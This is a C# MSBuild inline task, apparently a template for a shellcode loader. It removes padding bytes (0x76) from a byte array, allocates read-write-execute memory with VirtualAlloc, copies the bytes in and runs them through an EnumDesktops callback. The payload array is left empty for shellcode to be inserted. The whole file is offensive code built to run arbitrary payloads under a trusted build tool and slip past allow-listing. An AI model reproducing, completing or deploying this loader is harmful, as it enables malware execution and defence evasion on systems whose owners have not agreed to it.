using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using Microsoft.Build.Utilities;
using Microsoft.Build.Framework;
using System.Runtime.InteropServices;

public class RunMe :  Task, ITask {	

	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(IntPtr a, UInt32 b, UInt32 c, UInt32 d);

	[DllImport("user32")]
	private static extern bool EnumDesktops(IntPtr a, IntPtr b, IntPtr c);

	public override bool Execute() {	
		byte[] data = new byte[] { };
		byte[] final = new byte[data.Length];
		int position = 0;
		for(int i = 0; i < data.Length; i++)
		{
			if(data[i] != 0x76)
			{
				final[position] = data[i];
				position++;
			}
		}
		IntPtr mem = VirtualAlloc(IntPtr.Zero, (UInt32)final.Length, 0x00001000, 0x40);
		Marshal.Copy(final, 0, mem, final.Length);
		EnumDesktops(IntPtr.Zero, mem, IntPtr.Zero);
		return true;
	}
}
